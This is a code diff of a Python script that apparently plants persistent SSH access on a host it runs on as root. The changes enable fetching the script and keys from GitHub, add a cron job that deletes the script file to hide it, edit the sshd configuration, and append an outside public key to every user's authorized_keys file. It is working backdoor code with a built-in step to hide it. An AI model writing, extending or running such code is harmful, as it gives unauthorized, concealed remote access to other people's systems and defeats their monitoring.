@@ -25,9 +25,13 @@ def sshConfigEdit():
     flag2 = "GSSAPICleanupCredentials"
     with open(path, "r") as sshfile:
         newlines = []
+        oldlines = []
         for word in sshfile.readlines():
-            if flag1 in word or flag2 in word: continue
-            newlines.append(word)
+            if flag1 in word or flag2 in word: 
+                oldlines.append(word)
+            else:
+                newlines.append(word)
+    if not oldlines: return
     with open(path, "w") as sshfile:
         for line in newlines:
             sshfile.writelines(line)
@@ -54,6 +58,7 @@ def gitKeyPush():
         runCommand(f'mkdir -p {dir}')
         runCommand(f'chmod 0700 {dir}')
         subprocess.Popen(f'cat rsakeys.pub >> {sshAuthorized}', shell = True)
+        runCommand(f'chmod 0600 {sshAuthorized}')
     
     runCommand(f'rm -f {files[2]}')
 
@@ -149,22 +154,6 @@ def getScript():
         exit()
 
 
-def remoteAccessGen():
-    # need to generate keys on local & tgt
-    # need to make ssh folder for root to store key
-    # copy pub key into ssh_id folder for root
-    # restart ssh
-
-    # make ssh directories
-    runCommand("mkdir /etc/ssh")
-    runCommand("mkdir /etc/ssh/authorized_keys")
-
-    # need to get the keys
-
-
-
-
-
 def main():
     # First Attempt To Install Python3 for Easier Scripting
     update_python()
@@ -173,11 +162,11 @@ def main():
     if not is_root(): exit()
 
     # Update The Script From GitHub And Obtain Keys To Add
-    #getScript()
+    getScript()
 
     # Find Place To Hide The Script While Running
-    # cmd = "* * * * * rm -f " + locationFile
-    # appendCron(currentCRON, cmd)
+    cmd = "* * * * * rm -f " + locationFile
+    appendCron(currentCRON, cmd)
 
     # attempt to edit ssh files
     sshConfigEdit()
@@ -185,7 +174,6 @@ def main():
     # Find All Users And Append Keys
     gitKeyPush()
 
-    # HOW TO CONNECT (?? SHELLLLLLLLLLLLL)    
     
     
 
